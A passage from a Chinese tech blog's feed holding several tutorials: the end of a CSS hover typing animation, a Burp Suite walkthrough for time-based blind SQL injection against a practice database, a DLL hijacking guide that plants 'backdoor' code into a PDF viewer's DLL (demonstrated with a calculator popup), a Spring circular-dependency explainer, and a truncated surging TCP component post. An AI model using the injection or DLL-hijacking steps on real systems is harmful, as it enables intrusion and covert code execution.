<span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">animation</span>: blink .<span class="number">8s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> blink &#123;</span><br><span class="line">    <span class="number">0%</span>, <span class="number">50%</span> &#123;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">4px</span> solid transparent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">50%</span>, <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">4px</span> solid <span class="number">#000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> typing &#123;</span><br><span class="line">    <span class="selector-tag">from</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">11ch</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">to</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">26ch</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下，展示这样一个界面：</p><p><img src="https://static.luozhinet.com/97/ea0ade36df39a0fbfedb201c7b40d2"></p><p>接下来，我们把鼠标放上去，看看会发生什么：</p><p><img src="https://static.luozhinet.com/90/b12f7e81f7a699a11e957b226a3b66"></p><p>有意思，完美的实现了上面说的要求 – <strong>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</strong>。</p><p>当然，这里还运用了几个小技巧，一并解释下：</p><ol><li>打字动画运用了逐帧动画，而不是补间动画，主要利用了 CSS 动画的 <code>step-timing-function</code> 步骤缓动函数，也就是代码中的 <code>steps(15, end)</code></li><li><code>ch</code> 是 CSS 当中的一个相对单位，这一单位代表元素所用字体 font 中 “0” 这一字形的宽度</li><li><code>font-family: monospace</code> 表示等宽字体，每个字符占据的宽度是一样，因为我们使用了 <code>26ch</code> 来充当 <code>&lt;p&gt;</code> 元素的宽度，而 <code>Hover Me - You are a pig</code> 这一段文字算上空格刚好 26 个字符，<code>26ch</code> 刚好表示这一段文本的长度</li><li>一开始展示的文本 <code>Hover me -</code> 算上空格是 <code>11ch</code> 宽度，而最后整个文本展示完需要 <code>26ch</code> 的宽度，中间需要经过 15 步的逐帧动画，这里的元素刚好和代码中的一一对应上</li></ol><p>借助上面 4 步及搭配我们上文介绍的 <code>animation-fill-mode: both</code>、<code>animation-play-state: paused</code> 的应用，我们就完美的实现了这样一个非常有意思的打字动画。</p><p>完整的代码，你可以戳这里 <a href="https://codepen.io/Chokcoco/pen/QWQNJyp">CodePen Demo – running once animation by hover</a></p><p>如果你想对 CSS 动画有更深入细致的了解，可以翻看我的这篇文章，对动画的每一个属性都有着十分细致的讲解：<a href="https://github.com/chokcoco/iCSS/issues/141">深入浅出 CSS 动画</a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>OK，本文到此结束，希望本文对你有所帮助</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 长度 </tag>
            
            <tag> 对应 </tag>
            
            <tag> 界面 </tag>
            
            <tag> 运行 </tag>
            
            <tag> 代码 </tag>
            
            <tag> 动画 </tag>
            
            <tag> hover </tag>
            
            <tag> css </tag>
            
            <tag> 样式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp半自动时间盲注</title>
      <link href="/posts/826a9e25d95d/"/>
      <url>/posts/826a9e25d95d/</url>
      
        <content type="html"><![CDATA[<p><strong>直接开始</strong>  </p><p>实战中碰到延时的注入点，一个一个测太麻烦，Python脚本又不会写，那我们就善用Burp。</p><p>首先要构造好注入语句，接着使用<code>Burp</code>抓包</p><p><img src="https://static.luozhinet.com/8c/e361226b0a9109a724e236398c42d8&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="1.png"><br>发送到爆破模块<br><img src="https://static.luozhinet.com/a4/cef53c847afb5fa4225eb23b1ffe65&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="2.png"><br>去掉所有变量<br><img src="https://static.luozhinet.com/14/b2ec78fef9709f85183918b09a1815"></p><p> 设置两个变量</p><p>第一个是数据库的名字位，第二个是数据库名字符对应的ASCII码<br><img src="https://static.luozhinet.com/b0/57779620782a2e897eb9728ed119ff&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="4.png"><br>爆破两个变量 选择<code>Cluster bomb</code>模式<br><img src="https://static.luozhinet.com/5e/53f5285181247f3a6059b3231966de&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="5.png"><br>设置payload<br>第一个Payload是数据库的名字位</p><p>一共有5位，那么我们设置1~5即可<br><img src="https://static.luozhinet.com/66/2d1edec80a43c6f1139c532f3c557f&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="6.png"><br>第二个Payload是数据库名字对应的ASCII码，ASCII码最大为127</p><p><img src="https://static.luozhinet.com/b6/0d46f6f7ebb5a95076d2f143685d17&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"><br>那么设置的Payload为1~127</p><p>(如果前面没选择<code>Cluster bomb</code>模式，Payload set不会显示第二个变量)<br><img src="https://static.luozhinet.com/71/3debe03fff5fc6ad52c12f8c033584&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="8.png"><br>我们选择Numbers 设置为1~127 递增1<br><img src="https://static.luozhinet.com/c4/00b579070700a982a17aa411a887bf&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="9.png"><br>点击 <strong>Start attack</strong> 开始爆破<br><img src="https://static.luozhinet.com/5c/5ff8bce99e364d86187b9d21208793&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="10.png"><br>我们查看返回长度不一样的包，这里看Payload1</p><p><code>1对应的ASCII码为119   2对应的ASCII码为101   3对应的ASCII码为98   4对应的ASCII码为117   5对应的ASCII码为103</code></p><p><img src="https://static.luozhinet.com/e4/4e0a2c72c82872a8ce7a9af6a6a14b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="11.png"></p><p>得到数据库名为<code>webug</code></p><p><img src="https://static.luozhinet.com/5c/5809aad71be86880ed018dc97ca841"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 长度 </tag>
            
            <tag> ascii </tag>
            
            <tag> payload </tag>
            
            <tag> 对应 </tag>
            
            <tag> 变量 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单实现程序DLL劫持</title>
      <link href="/posts/5f847f658ba3/"/>
      <url>/posts/5f847f658ba3/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="**0x00 前言"></a>**0x00 前言</h3><p>**</p><p>程序启动会调用固定的.dll文件，通过特定的手法将木马代码和进程注入到可被劫持的DLL文件中，当程序正常启动，我们代码也会秘密执行。</p><h3 id="0x01-利用过程"><a href="#0x01-利用过程" class="headerlink" title="**0x01 利用过程"></a>**0x01 利用过程</h3><p>**</p><p>用到的工具</p><blockquote><p><code>1、Aheadlib   2、Visual Studio</code></p></blockquote><p>用美图看看Pdf来测试，朋友们可以拿这个练手，毕竟只有一个<code>.dll</code>文件，小傻瓜都知道是调用的这个<code>dll</code>来启动程序的</p><p><img src="https://static.luozhinet.com/af/eda6d71296cd86268d6552953dc1c7&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>找到易劫持的dll文件，打开<code>Aheadlib</code>，引入<br>注意这里设置的原始<code>dll</code>文件名，记住了最后正常<code>dll</code>名字要修改成这个</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/a3d0343e77de9e860931119914b75ca4.jpg.png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>点击生成会在程序目录下生成一个<code>.cpp</code>文件</p><p><img src="https://static.luozhinet.com/31/26c1b33e909594530d62653db8cfaa&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h5 id="0x02-修改劫持代码，注入进程后门"><a href="#0x02-修改劫持代码，注入进程后门" class="headerlink" title="0x02 修改劫持代码，注入进程后门"></a><strong>0x02 修改劫持代码，注入进程后门</strong></h5><p>打开<code>VisualStudio</code>，添加一个动态链接库，专门用于生成<code>dll</code>的，将生成的代码全选粘贴进去，注意</p><blockquote><p><code>#include &quot;pch.h&quot;</code></p></blockquote><p>不要删，这是定义<code>DLL</code>程序的入口点很重要</p><p><img src="https://static.luozhinet.com/0c/e308388d0d1d70475886da2b71b8ff&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/fe/447340013634403207756d3d42944b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>在主函数里加入后门代码（注入木马进程) 调用计算器来测试</p><p><img src="https://static.luozhinet.com/53/9e2616b7d19deae29f2380bdd7c09b&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>生成，ok没有报错</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/2a934672d4646a09f660b8d08208155c.jpg.png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>把<code>dll</code>赋值到程序目录改名为<code>pdfcore.dll</code> 原文件改为<code>pdfcoreOrg.dll</code></p><p><img src="https://static.luozhinet.com/a0/bc629b04228d2a67b1fb6f1d53a079&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>打开程序，弹出计算器</p><p><img src="https://static.luozhinet.com/f3/0ddc3a03f7675fc10ad8819c4af638&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/76/01e03df3f413b0a5131919b70d564a&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://static.luozhinet.com/92/db16d707d6a0ce81399247e8307125&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件 </tag>
            
            <tag> 程序 </tag>
            
            <tag> 代码 </tag>
            
            <tag> 生成 </tag>
            
            <tag> dll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>画图带你彻底弄懂三级缓存和循环依赖的问题</title>
      <link href="/posts/da30ceee0d7b/"/>
      <url>/posts/da30ceee0d7b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://static.luozhinet.com/55/dc8be251b6f726f90d68d062fb3690"></p><p>大家好。我们都知道，Spring可以通过三级缓存解决循环依赖的问题，这也是面试中很常见的一个面试题，本文就来着重讨论一下有关循环依赖和三级缓存的问题。</p><p>一、什么是循环依赖</p><p>大家平时在写业务的时候应该写过这样的代码。<img src="https://static.luozhinet.com/d8/f22acc0b63a10c00396cb76bc8e427"></p><p> <img src="https://static.luozhinet.com/c1/280841d5b27479698ffe8ec02e5662"></p><p> <img src="https://static.luozhinet.com/18/52d787d7461933b8f219c0aa2a0076"></p><p>其实这种类型就是循环依赖，就是AService 和BService两个类相互引用。</p><p>二、三级缓存可以解决的循环依赖场景</p><p>如上面所说，大家平时在写这种代码的时候，项目其实是可以起来的，也就是说其实三级缓存是可以解决这种循环依赖的。</p><p>当然除了这种字段注入，set注入也是可以解决的，代码如下。</p><p><img src="https://static.luozhinet.com/34/e400f6e2d4e2979b2273a7cad3cb2a"></p><p>接下来就来探究三级缓存是如何解决这种循环依赖的？</p><p>三、Spring的Bean是如何创建出来的</p><p>本文所说的Bean和对象可以理解为同一个意思。</p><p>先说如何解决循环依赖之前，先来了解一下一个Bean创建的大致流程。为什么要说Bean的创建过程，因为循环依赖主要是发生在Bean创建的过程中，知道Bean是如何创建的，才能更好的理解三级缓存的作用。</p><p>其实Spring Bean的生命周期源码剖析我也在微信公众号 三友的java日记 中发过，并且有简单的提到三级缓存，有兴趣的同学可以在关注公众号之后回复 Bean 即可获取文章链接，里面有Bean创建过程更详细的说明。这里我简单画一张图来说一下。</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/3488fd1c48472e5f68aaad85f3497c44.jpg.png"></p><p>其实图里的每个阶段还可以分为一些小的阶段，我这里就没画出来了。</p><p>来说一下每个阶段干了什么事。</p><ul><li>BeanDefinition的读取阶段：我们在往Spring容器注入Bean的时候，一般会通过比如xml方式，@Bean注解的方式，@Component注解的方式，其实不论哪一种，容器启动的时候都会去解析这些配置，然后为每个Bean生成一个对应的BeanDefinition，这个BeanDefinition包含了这个Bean的创建的信息，Spring就是根据BeanDefinition去决定如何创建一个符合你要求的Bean</li><li>Bean的实例化阶段：这个阶段主要是将你配置的Bean根据Class的类型创建一个对象出来</li><li>Bean的属性赋值阶段：这个阶段主要是用来处理属性的赋值，比如@Autowired注解的生效就是在这个阶段的</li><li>Bean的初始化阶段：这个阶段主要是回调一些方法，比如你的类实现了InitializingBean接口，那么就会回调afterPropertiesSet方法，同时动态代理其实也是在这个阶段完成的。</li></ul><p>其实从这可以看出，一个Spring Bean的生成要分为很多的阶段，只有这些事都处理完了，这个Bean才是完完全全创建好的Bean，也就是我们可以使用的Bean。</p><p>四、三级缓存指的是哪三级缓存</p><p>这里直接上源码</p><p><img src="https://static.luozhinet.com/9f/8af669aa4bd4bf2f64cedb783b02ac"></p><p>第一级缓存：singletonObjects</p><p>存放已经完完全全创建好的Bean，什么叫完完全全创建好的？就是上面说的是，所有的步骤都处理完了，就是创建好的Bean。一个Bean在产的过程中是需要经历很多的步骤，在这些步骤中可能要处理@Autowired注解，又或是处理@Transcational注解，当需要处理的都处理完之后的Bean，就是完完全全创建好的Bean，这个Bean是可以用来使用的，我们平时在用的Bean其实就是创建好的。</p><p>第二级缓存：earlySingletonObjects</p><p>早期暴露出去的Bean，其实也就是解决循环依赖的Bean。早期的意思就是没有完完全全创建好，但是由于有循环依赖，就需要把这种Bean提前暴露出去。其实 早期暴露出去的Bean 跟 完完全全创建好的Bean 他们是同一个对象，只不过早期Bean里面的注解可能还没处理，完完全全的Bean已经处理了完了，但是他们指的还是同一个对象，只不过它们是在Bean创建过程中处于的不同状态，如果早期暴露出去的Bean跟完完全全创建好的Bean不是同一个对象是会报错的，项目也就起不来，这个不一样导致报错问题，这里我会结合一个案例再来写一篇文章，这里不用太care，就认为是一样的。</p><p>第三级缓存：singletonFactories</p><p>存的是每个Bean对应的ObjectFactory对象，通过调用这个对象的getObject方法，就可以获取到早期暴露出去的Bean。</p><p>注意：这里有个很重要的细节就是三级缓存只会对单例的Bean生效，像多例的是无法利用到三级缓存的，通过三级缓存所在的类名DefaultSingletonBeanRegistry就可以看出，仅仅是对SingletonBean也就是单例Bean有效果。</p><p><img src="https://static.luozhinet.com/60/781a3a29a311b2380ed9d2614273df"></p><p>五、三级缓存在Bean生成的过程中是如何解决循环依赖的</p><p>这里我假设项目启动时先创建了AService的Bean，那么就会根据Spring Bean创建的过程来创建。</p><p>在Bean的实例化阶段，就会创建出AService的对象，此时里面的@Autowired注解是没有处理的，创建出AService的对象之后就会构建AService对应的一个ObjectFactory对象放到三级缓存中，通过这个ObjectFactory对象可以获取到AService的早期Bean。</p><p><img src="https://static.luozhinet.com/40/a8ad1bb23fd9ba153e9e5b89fddccb"></p><p>然后AService继续往下走，到了某一个阶段，开始处理@Autowired注解，要注入BService对象，如图</p><p><img src="https://static.luozhinet.com/eb/90550d1c266f1ff17ff0e49d509482"></p><p>要注入BService对象，肯定要去找BService对象，那么他就会从三级缓存中的第一级缓存开始依次查找有没有BService对应的Bean，肯定都没有啊，因为BService还没创建呢。没有该怎么办呢？其实很好办，没有就去创建一个么，这样不就有了么。于是AService的注入BService的过程就算暂停了，因为现在得去创建BService，创建之后才能注入给AService。</p><p>于是乎，BService就开始创建了，当然他也是Spring的Bean，所以也按照Bean的创建方式来创建，先实例化一个BService对象，然后缓存对应的一个ObjectFactory到第三级缓存中，然后就到了需要处理@Autowired注解的时候了，如图。</p><p><img src="https://static.luozhinet.com/57/8308e4f3ef647870324ba5801749ff"></p><p>@Autowired注解需要注入AService对象。注入AService对象，就需要先去拿到AService对象，此时也会一次从三级缓存查有没有AService。</p><p>先从第一级查，有没有创建好的AService，肯定没有，因为AService此时正在在创建（因为AService在创建的过程中需要注入BService才去创建BService的，虽然此刻代码正在创建BService，但是AService也是在创建的过程中，只不过暂停了，只要BService创建完，AService会继续往下创建）；第一级缓存没有，那么就去第二级看看，也没有，没有早期的AService；然后去第三级缓存看看有没有AService对应的ObjectFactory对象，惊天的发现，竟然有(上面提到过，创建出AService的对象之后，会构建AService对应的一个ObjectFactory对象放到三级缓存中)，那么此时就会调用AService对应的ObjectFactory对象的getObject方法，拿到早期的AService对象，然后将早期的AService对象放到二级缓存，为什么需要放到二级缓存，主要是怕还有其他的循环依赖，如果还有的话，直接从二级缓存中就能拿到早期的AService对象。</p><p><img src="https://static.luozhinet.com/e9/7888a75ac76e5de3b9a56ab854952e"></p><p>虽然是早期的AService对象，但是我前面说过，仅仅只是早期的AService对象可能有些Bean创建的步骤还没完成，跟最后完完全全创建好的AService Bean是同一个对象。</p><p>于是接下来就把早期的AService对象注入给BService。</p><p><img src="https://static.luozhinet.com/08/491f6466dfdca4dfa33f060c82119f"></p><p>此时BService的@Autowired注解注入AService对象就完成了，之后再经过其他阶段的处理之后，BService对象就完完全全的创建完了。</p><p>BService对象创建完之后，就会将BService放入第一级缓存，然后清空BService对应的第三级缓存，当然也会去清空第二级缓存，只是没有而已，至于为什么清空，很简单，因为BService已经完全创建好了，如果需要BService那就在第一级缓存中就能查找到，不需要在从第二级或者第三级缓存中找到早期的BService对象。</p><p><img src="https://static.luozhinet.com/ee/a27553a7cfbcd77710f19e303c1e8a"></p><p>BService对象就完完全全的创建完之后，那么接下来该干什么呢？此时当然继续创建AService对象了，你不要忘了为什么需要创建BService对象，因为AService对象需要注入一个BService对象，所以才去创建BService的，那么此时既然BService已经创建完了，那么是不是就应该注入给AService对象了？所以就会将BService注入给AService对象，这下就明白了，BService在构建的时候，已经注入了AService，虽然是早期的AService，但的确是AService对象，现在又把BService注入给了AService，那么是不是已经解决了循环依赖的问题了，AService和BService都各自注入了对方，如图。</p><p><img src="http://139.198.176.82:86/data/images/2022-05-24/fdd2c7a14514b6edf36c0e67f3990b8a.jpg"></p><p>然后AService就会跟BService一样，继续处理其它阶段的，完全创建好之后，也会清空二三级缓存，放入第一级缓存。</p><p><img src="https://static.luozhinet.com/6c/db757ad8b3921443f02d347b7c0749"></p><p>到这里，AService和BService就都创建好了，循环依赖也就解决了。</p><p>这下你应该明白了三级缓存的作用，主要是第二级和第三级用来存早期的对象，这样在有循环依赖的对象，就可以注入另一个对象的早期状态，从而达到解决循环依赖的问题，而早期状态的对象，在构建完成之后，也就会成为完完全全可用的对象。</p><p>六、三级缓存无法解决的循环依赖场景</p><p>1）构造器注入无法解决循环依赖</p><p>上面的例子是通过@Autowired注解直接注入依赖的对象，但是如果通过构造器注入循环依赖的对象，是无法解决的，如代码下</p><p><img src="https://static.luozhinet.com/cb/d5400bfd3e170d87c0e9c09e51186c"></p><p>构造器注入就是指创建AService对象的时候，就传入BService对象，而不是用@Autowired注解注入BService对象。</p><p>运行结果</p><p><img src="https://static.luozhinet.com/95/3b7cf7debff17a415ea23a80b20710"></p><p>启动时就会报错，所以通过构造器注入对象就能避免产生循环依赖的问题，因为如果有循环依赖的话，那么就会报错。</p><p>至于三级缓存为什么不能解决构造器注入的问题呢？其实很好理解，因为上面说三级缓存解决循环依赖的时候主要讲到，在AService实例化之后，会创建对应的ObjectFactory放到第三级缓存，发生循环依赖的时候，可以通过ObjectFactory拿到早期的AService对象；而构造器注入，是发生在实例化的时候，此时还没有AService对象正在创建，还没完成，压根就还没执行到往第三级添加对应的ObjectFactory的步骤，那么BService在创建的时候，就无法通过三级缓存拿到早期的AService对象，拿不到怎么办，那就去创建AService对象，但是AService不是正在创建么，于是会报错。</p><p>2）注入多例的对象无法解决循环依赖</p><p><img src="https://static.luozhinet.com/da/afce6814b4233cb5a312960e686df8"></p><p><img src="https://static.luozhinet.com/b8/d142a3cc0728379e70c3712379b102"></p><p>启动引导类</p><p><img src="https://static.luozhinet.com/70/bc35e49036e927d0dd18f5a9c44d6c"></p><p>要获取AService对象，因为多例的Bean在容器启动的时候是不会去创建的，所以得去获取，这样就会创建了。</p><p>运行结果</p><p><img src="https://static.luozhinet.com/63/325a9cab69b81b9cd0fc2131cd6e16"></p><p>为什么不能解决，上面在说三级缓存的时候已经说过了，三级缓存只能对单例Bean生效，那么多例是不会起作用的，并且在创建Bean的时候有这么一个判断，那就是如果出现循环依赖并且是依赖的是多例的Bean，那么直接抛异常，源码如下</p><p><img src="https://static.luozhinet.com/9e/b6d4acbf1982132c3e11651d11cc08"></p><p>注释其实说的很明白，推测出现了循环依赖，抛异常。</p><p>所以上面提到的两种循环依赖的场景，之所以无法通过三级缓存来解决，是因为压根这两种场景就无法使用三级缓存，所以三级缓存肯定解决不掉。</p><p>七、不用三级缓存，用二级缓存能不能解决循环依赖</p><p>遇到这种面试题，你就跟面试官说，如果行的话，Spring的作者为什么不这么写呢？</p><p>哈哈，开个玩笑，接下来说说到底为什么不行。</p><p>这里我先说一下前面没提到的细节，那就是通过ObjectFactory获取的Bean可能是两种类型，第一种就是实例化阶段创建出来的对象，还是一种就是实例化阶段创建出来的对象的代理对象。至于是不是代理对象，取决于你的配置，如果添加了事务注解又或是自定义aop切面，那就需要代理。这里你不用担心，如果这里获取的是代理对象，那么最后完全创建好的对象也是代理对象，ObjectFactory获取的对象和最终完全创建好的还是同一个，不是同一个肯定会报错，所以上面的理论依然符合，这里只是更加的细节化。</p><p>有了这个知识点之后，我们就来谈一下为什么要三级缓存。</p><p>第一级缓存，也就是缓存完全创建好的Bean的缓存，这个缓存肯定是需要的，因为单例的Bean只能创建一次，那么肯定需要第一级缓存存储这些对象，如果有需要，直接从第一级缓存返回。那么如果只能有二级缓存的话，就只能舍弃第二级或者第三级缓存。</p><p>假设舍弃第三级缓存</p><p>舍弃第三级缓存，也就是没有ObjectFactory，那么就需要往第二缓存放入早期的Bean，那么是放没有代理的Bean还是被代理的Bean呢？</p><p>1）如果直接往二级缓存添加没有被代理的Bean，那么可能注入给其它对象的Bean跟最后最后完全生成的Bean是不一样的，因为最后生成的是代理对象，这肯定是不允许的；</p><p>2）那么如果直接往二级缓存添加一个代理Bean呢？</p><ul><li>假设没有循环依赖，提前暴露了代理对象，那么如果跟最后创建好的不一样，那么项目启动就会报错，</li><li>假设没有循环依赖，使用了ObjectFactory，那么就不会提前暴露了代理对象，到最后生成的对象是什么就是什么，就不会报错，</li><li>如果有循环依赖，不论怎样都会提前暴露代理对象，那么如果跟最后创建好的不一样，那么项目启动就会报错</li></ul><p>通过上面分析，如果没有循环依赖，使用ObjectFactory，就减少了提前暴露代理对象的可能性，从而减少报错的可能。</p><p>假设舍弃第二级缓存</p><p>假设舍弃第二级缓存，也就是没有存放早期的Bean的缓存，其实肯定也不行。上面说过，ObjectFactory其实获取的对象可能是代理的对象，那么如果每次都通过ObjectFactory获取代理对象，那么每次都重新创建一个代理对象，这肯定也是不允许的。</p><p>从上面分析，知道为什么不能使用二级缓存了吧，第三级缓存就是为了避免过早地创建代理对象，从而避免没有循环依赖过早暴露代理对象产生的问题，而第二级缓存就是防止多次创建代理对象，导致对象不同。</p><p>本文完。</p><p>如果觉得这篇文章对你有所帮助，还请帮忙点赞、在看、转发给更多的人，码字不易，非常感谢！</p><h2 id="欢迎关注公众号-三友的java日记，更多技术干货及时获得。"><a href="#欢迎关注公众号-三友的java日记，更多技术干货及时获得。" class="headerlink" title="欢迎关注公众号 三友的java日记，更多技术干货及时获得。"></a>欢迎关注公众号 三友的java日记，更多技术干货及时获得。</h2><p><strong>往期热门文章推荐</strong></p><ul><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247485437&idx=1&sn=d88a7febec0148f5681ca7c728fd8990&chksm=cfd95435f8aedd234a0019f8a0f39832cd2c5a3c7401643e5b666bb141db1fe83e7ea6ab670f&scene=21#wechat_redirect">万字+28张图带你探秘小而美的规则引擎框架LiteFlow</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484636&idx=1&sn=834df6a5bf598819d30b2b8f6d42d242&chksm=cfd95714f8aede0210ad9d215b69b25851c17cfb02cab849c6bccea49868b66adda596487b13&scene=21#wechat_redirect">7000字+24张图带你彻底弄懂线程池</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484211&idx=1&sn=13b1cb0832bfae9a6d2369193700fd19&chksm=cfd950fbf8aed9ed473a0e170480770c311f1b637607332a0df15f32e2e9a446f8bc97f0b295&scene=21#wechat_redirect">【SpringCloud原理】OpenFeign原来是这么基于Ribbon来实现负载均衡的</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484202&idx=1&sn=a89f4c393ca2d09b263aab79e4ebfd3d&chksm=cfd950e2f8aed9f4e6f49d93b8120d93382899b7d5eccab06b26c76042abf89a98653410b1d1&scene=21#wechat_redirect">【SpringCloud原理】Ribbon核心组件以及运行原理源码剖析</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484185&idx=1&sn=efb3a1f459be9970126269234ff813e7&chksm=cfd950d1f8aed9c7c9ec6bc8b00c376d9777aa6d6aa2b93ccf6a4b4376adbed8c4f3e1e3754b&scene=21#wechat_redirect">【SpringCloud原理】OpenFeign之FeignClient动态代理生成原理</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484124&idx=1&sn=8133290e6dd4c55a310c3d4be1ce0fd7&chksm=cfd95114f8aed802fbdcff8990082ef96195e6b9dcfaf357fc23a0f85045622b8cdaddead1f4&scene=21#wechat_redirect">synchronized真的很重么？</a></p></li><li><p><a href="http://mp.weixin.qq.com/s?__biz=Mzg5MDczNDI0Nw==&mid=2247484115&idx=1&sn=ae26f9eff454497d6aec66a276b5f3e6&chksm=cfd9511bf8aed80d3ef0e319c8b53b436cb1a294081ace96362524ce12a0d60b2785c72473cf&scene=21#wechat_redirect">一文带你看懂Java中的Lock锁底层AQS到底是如何实现的</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 创建 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 处理 </tag>
            
            <tag> 代码 </tag>
            
            <tag> 生成 </tag>
            
            <tag> 同学 </tag>
            
            <tag> bean </tag>
            
            <tag> aservice </tag>
            
            <tag> bservice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于surging网络组件多协议适配的平台化发展</title>
      <link href="/posts/1a173ceb8ef1/"/>
      <url>/posts/1a173ceb8ef1/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="**前言"></a>**前言</h2><p>**</p><p>               Surging 发展已经有快6年的时间，经过这些年的发展，功能框架也趋于成熟，但是针对于商业化需求还需要不断的打磨，前段时间客户找到我想升级成平台化，针对他的需求我们讨论了很久，他的一些需求想法还是非常先进的，针对于现在surging 还有很多需要研发打磨，后面因为时间成本的关系我拒绝了他，我也打算后面慢慢的将surging升级为平台化以便支持物联网，流媒体等业务场景，可以通过统一定义，统一管理来配置构建各种业务场景，而web网关，设备网关，流媒体网关等各种类型的网关可以通过配置添加删除网络协议组件，以便可以支持多种协议适配，设配管理和配置规则引擎等业务场景。 今天所要讲的是以TCP组件为范本如何进行优化构建成平台化多协议适配。</p><h2 id="构建TCP组件"><a href="#构建TCP组件" class="headerlink" title="构建TCP组件"></a><strong>构建TCP组件</strong></h2><p> 首先来看看如何创建配置启动协议组件，以TCP协议组件为例，以下代码用于创建具有配置属性的TCP网络组件，并配置规则引擎脚本以解码消息</p><p>  var config &#x3D;new Dictionary&lt;string, object&gt;();<br>            config.Add(“script”, @”parser.Fixed(4).Handler(<br>                  function(buffer){<br>                    var buf &#x3D; BytesUtils.Slice(buffer,1,4);<br>                    parser.Fixed(buffer.ReadableBytes).Result(buf);<br>             }).Handler(<br>                    function(buffer){parser.Fixed(8).Result(buffer);}<br>            ).Handler(function(buffer){<br>                    parser.Result(‘处理完成’,’gb2312’).Complete();<br>                 }<br>             )”);<br>            var network&#x3D;  serviceProvider.ServiceProvoider.GetInstances&lt;INetworkProvider<TcpServerProperties>&gt;().CreateNetwork(new TcpServerProperties<br>           {<br>               ParserType = PayloadParserType.Script,<br>               PayloadType = PayloadType.String,<br>               Host = “127.0.0.1”,<br>               Port = 322,<br>               ParserConfiguration = config<br>           });<br>            network.StartAsync();</p><p>以下代码用于创建具有配置属性的TCP网络组件，并配置direct解码消息</p><p>  var network1 &#x3D; serviceProvider.ServiceProvoider.GetInstances&lt;INetworkProvider<TcpServerProperties>&gt;().CreateNetwork(new TcpServerProperties<br>            {<br>                ParserType = PayloadParserType.Direct,<br>                PayloadType = PayloadType.String,<br>                Host = “127.0.0.1”,<br>                Port = 321<br>            });<br>            network1.StartAsync();</p><p>还有两种类型的payload parser：fixedlength和delimited，这里就不依次说明了，直接通过添加更改ParserType属性就能配置相关的parse</p><p>创建Tcp服务</p><p> public class TcpService : TcpBehavior, ITcpService<br>    {<br>        private readonly IDeviceProvider _deviceProvider;<br>        public TcpService(IDeviceProvider deviceProvider)<br>        {<br>            _deviceProvider = deviceProvider;<br>        }</p><pre><code>    public override void Load(string 